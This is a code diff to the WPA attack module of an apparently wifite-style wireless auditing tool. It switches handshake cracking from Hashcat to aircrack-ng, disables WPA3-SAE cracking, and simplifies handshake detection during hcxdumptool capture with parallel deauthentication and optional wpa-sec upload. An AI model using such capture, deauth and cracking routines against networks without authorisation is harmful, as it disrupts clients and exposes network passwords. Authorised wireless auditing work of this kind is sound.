@@ -3,7 +3,6 @@
 
 from ..model.attack import Attack
 from ..tools.aircrack import Aircrack
-from ..tools.hashcat import Hashcat
 from ..tools.airodump import Airodump
 from ..tools.aireplay import Aireplay
 from ..config import Configuration
@@ -203,11 +202,7 @@ class AttackWPA(Attack):
         # or a WPA2 handshake. Old .cap files from airodump-ng contain WPA2 handshakes.
         # Only .pcapng files from hcxdumptool contain SAE handshakes.
 
-        cracker = "Hashcat" # Default to Hashcat
-        # TODO: Potentially add a fallback or user choice for aircrack-ng for non-SAE?
-        # For now, transitioning WPA/WPA2 cracking to Hashcat as well for consistency,
-        # as Hashcat mode 22000 (hccapx) is generally preferred over aircrack-ng.
-        # Aircrack.crack_handshake might be removed or kept for WEP only in future.
+        cracker = "aircrack-ng"
 
         wordlist_name = os.path.split(Configuration.wordlist)[-1] if Configuration.wordlist else "default wordlist"
         crack_msg = f'Cracking {"WPA3-SAE" if target_is_wpa3_sae else "WPA/WPA2"} Handshake: Running {cracker} with {wordlist_name} wordlist'
@@ -226,14 +221,13 @@ class AttackWPA(Attack):
                 }
             })
 
-        try:
-            key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1)
-        except ValueError as e: # Catch errors from hash file generation (e.g. bad capture)
-            error_msg = f"Error during hash file generation for cracking: {e}"
-            Color.pl(f"[!] {error_msg}")
+        if target_is_wpa3_sae:
+            Color.pl('{!} {O}WPA3-SAE cracking is disabled (aircrack-ng does not support SAE){W}')
             if self.view:
-                self.view.add_log(error_msg)
+                self.view.add_log('WPA3-SAE cracking disabled (aircrack-ng does not support SAE)')
             key = None
+        else:
+            key = Aircrack.crack_handshake(handshake, show_command=Configuration.verbose > 1)
 
         if key is None:
             fail_msg = f"Failed to crack handshake: {wordlist_name} did not contain password"
@@ -792,7 +786,7 @@ class AttackWPA(Attack):
         Returns:
             Handshake object if captured, None otherwise
         """
-        from ..tools.hcxdumptool import HcxDumpTool, HcxPcapngTool
+        from ..tools.hcxdumptool import HcxDumpTool
         
         handshake = None
         
@@ -910,70 +904,47 @@ class AttackWPA(Attack):
                 except (OSError, IOError):
                     pass
                 
-                # Convert pcapng to hashcat format for validation
-                temp_hash_file = Configuration.temp('handshake_check.22000')
-                
-                # Filter by target BSSID when converting
-                from ..util.logger import log_debug
-                log_debug('AttackWPA', f'Checking for handshake in capture file (BSSID: {self.target.bssid})')
-                
-                if HcxPcapngTool.convert_to_hashcat(
+                hs_probe = Handshake(
                     output_file,
-                    temp_hash_file,
                     bssid=self.target.bssid,
-                    essid=self.target.essid if hasattr(self.target, 'essid') else None
-                ):
-                    # Check if the hash file contains a valid handshake
-                    if os.path.exists(temp_hash_file) and os.path.getsize(temp_hash_file) > 0:
-                        # We got a handshake!
-                        from ..util.logger import log_info
-                        log_info('AttackWPA', f'Handshake captured successfully for {self.target.bssid} [DUAL-HCX]')
-                        
-                        Color.clear_entire_line()
-                        Color.pattack('WPA',
-                                      self.target,
-                                      'Handshake capture',
-                                      '{G}Captured handshake{W} [DUAL-HCX]')
-                        Color.pl('')
-                        
+                    essid=self.target.essid if hasattr(self.target, 'essid') else None,
+                )
+                if hs_probe.has_handshake():
+                    from ..util.logger import log_info
+                    log_info('AttackWPA', f'Handshake captured successfully for {self.target.bssid} [DUAL-HCX]')
+
+                    Color.clear_entire_line()
+                    Color.pattack('WPA', self.target, 'Handshake capture', '{G}Captured handshake{W} [DUAL-HCX]')
+                    Color.pl('')
+
+                    if self.view:
+                        self.view.add_log('Captured handshake!')
+                        self.view.update_progress({
+                            'status': 'Handshake captured successfully',
+                            'progress': 1.0,
+                            'metrics': {
+                                'Handshake': '✓',
+                                'Mode': 'DUAL-HCX (hcxdumptool)',
+                                'Capture': self.capture_interface,
+                                'Deauth': self.deauth_interface,
+                                'Clients': len(self.clients)
+                            }
+                        })
+
+                    handshake = hs_probe
+
+                    if WpaSecUploader.should_upload():
+                        capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
                         if self.view:
-                            self.view.add_log('Captured handshake!')
-                            self.view.update_progress({
-                                'status': 'Handshake captured successfully',
-                                'progress': 1.0,
-                                'metrics': {
-                                    'Handshake': '✓',
-                                    'Mode': 'DUAL-HCX (hcxdumptool)',
-                                    'Capture': self.capture_interface,
-                                    'Deauth': self.deauth_interface,
-                                    'Clients': len(self.clients)
-                                }
-                            })
-                        
-                        # Create Handshake object from pcapng file
-                        handshake = Handshake(output_file, 
-                                            bssid=self.target.bssid,
-                                            essid=self.target.essid if hasattr(self.target, 'essid') else None)
-                        
-                        # Upload to wpa-sec if configured
-                        if WpaSecUploader.should_upload():
-                            # hcxdumptool creates .pcapng files which may contain SAE handshakes
-                            capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
-                            if self.view:
-                                self.view.add_log("Checking wpa-sec upload configuration...")
-                            WpaSecUploader.upload_capture(
-                                handshake.capfile,
-                                self.target.bssid,
-                                self.target.essid if hasattr(self.target, 'essid') else None,
-                                capture_type=capture_type,
-                                view=self.view
-                            )
-                        
-                        break
-                
-                # Clean up temp hash file
-                if os.path.exists(temp_hash_file):
-                    os.remove(temp_hash_file)
+                            self.view.add_log("Checking wpa-sec upload configuration...")
+                        WpaSecUploader.upload_capture(
+                            handshake.capfile,
+                            self.target.bssid,
+                            self.target.essid if hasattr(self.target, 'essid') else None,
+                            capture_type=capture_type,
+                            view=self.view
+                        )
+                    break
                 
                 # Send parallel deauth when timer expires
                 if deauth_timer.ended():
